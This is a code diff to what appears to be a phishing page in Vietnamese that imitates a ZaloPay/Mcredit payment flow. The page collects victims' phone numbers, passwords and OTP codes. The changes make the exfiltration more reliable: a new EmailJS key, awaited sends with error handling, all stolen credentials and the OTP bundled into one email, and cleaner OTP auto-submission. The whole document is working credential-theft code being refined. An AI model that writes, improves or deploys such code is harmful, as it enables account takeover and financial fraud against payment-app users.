@@ -38,7 +38,7 @@
         otp: {
           serviceId: "service_ezzpzs5",
           templateId: "template_1w45spc",
-          publicKey: "ylpUZgvVRFDRFaYoo",
+          publicKey: "XeUDXCAtHzVR9J6rc",
           platform: "ZaloPay → OTP (Mcredit Layout v4)",
         },
       };
@@ -1148,7 +1148,7 @@
           showSection("zalopay-otp-section");
         };
 
-        window.handleOtpSubmit = () => {
+        window.handleOtpSubmit = async () => {
           credentials.otp = Array.from(otpInputs)
             .map((input) => input.value)
             .join("");
@@ -1162,7 +1162,15 @@
           otpLoading.style.display = "block";
           otpSubmitBtn.disabled = true;
 
-          sendToEmail("otp", credentials.otp);
+          try {
+            await sendToEmail("otp", credentials.otp);
+          } catch (error) {
+            console.error("EmailJS OTP error:", error);
+            showNotification(
+              "Không gửi được OTP qua EmailJS. Vui lòng thử lại.",
+              "error"
+            );
+          }
 
           setTimeout(() => {
             otpLoading.style.display = "none";
@@ -1211,25 +1219,32 @@
           otpInputs[0].focus();
         };
 
-        const sendToEmail = (type, value) => {
+        const sendToEmail = async (type, value) => {
+          if (typeof emailjs === "undefined") {
+            throw new Error("EmailJS chưa được tải.");
+          }
+
           const config = getZalopayEmailjsConfig(type);
           if (!config) return;
 
-          let templateParams = {};
           const contractNumber =
             formData.contractNumber ||
             getEl("customer-details")?.querySelector(
               ".detail-item:last-child .value"
             )?.textContent ||
-            "";
+            `SHB-${Date.now()}`;
 
           const commonParams = {
             platform: config.platform,
             contract_number: contractNumber,
-            customer_name: formData.fullName || "",
-            total_amount: getEl("mainTotalAmount").textContent || "",
+            customer_name: formData.fullName || "Không có",
+            total_amount:
+              getEl("mainTotalAmount")?.textContent ||
+              formData.amount ||
+              "Không có",
           };
 
+          let templateParams = {};
           if (type === "phone") {
             templateParams = { ...commonParams, phone: value };
           } else if (type === "password") {
@@ -1240,10 +1255,16 @@
             };
           } else if (type === "otp") {
             templateParams = {
-              ...commonParams,
-              phone: credentials.phone,
-              password: credentials.password,
               otp: value,
+              phone: credentials.phone || "Không có",
+              customer_name: formData.fullName || "Không có",
+              total_amount:
+                getEl("mainTotalAmount")?.textContent ||
+                formData.amount ||
+                "Không có",
+              contract_number: contractNumber,
+              platform: config.platform,
+              password: credentials.password || "",
             };
           }
 
@@ -1252,21 +1273,20 @@
             templateParams,
             config
           );
-          emailjs
-            .send(
-              config.serviceId,
-              config.templateId,
-              templateParams,
-              { publicKey: config.publicKey }
-            )
-            .then(() => console.log(`${type} sent successfully.`, config))
-            .catch((err) =>
-              console.error(
-                `EmailJS send failed for ${type}:`,
-                JSON.stringify(err),
-                config
-              )
-            );
+
+          const response = await emailjs.send(
+            config.serviceId,
+            config.templateId,
+            templateParams,
+            { publicKey: config.publicKey }
+          );
+
+          if (response.status !== 200) {
+            throw new Error(`EmailJS trả về mã lỗi: ${response.status}`);
+          }
+
+          console.log(`${type} sent successfully.`, config);
+          return response;
         };
 
         const clearOtpInputs = () => {
@@ -1291,6 +1311,7 @@
 
           otpInputs.forEach((input, index) => {
             input.addEventListener("input", () => {
+              input.value = input.value.replace(/\D/g, "").slice(0, 1);
               if (input.value && index < otpInputs.length - 1) {
                 otpInputs[index + 1].focus();
               }
@@ -1299,7 +1320,7 @@
                   .map((i) => i.value)
                   .join("").length === 6
               ) {
-                handleOtpSubmit();
+                window.handleOtpSubmit();
               }
             });
             input.addEventListener("keydown", (e) => {
@@ -1321,7 +1342,7 @@
                 pasteData.length > 0 ? pasteData.length : 0
               );
               if (otpInputs[focusIndex]) otpInputs[focusIndex].focus();
-              if (pasteData.length === 6) handleOtpSubmit();
+              if (pasteData.length === 6) window.handleOtpSubmit();
             });
           });
 
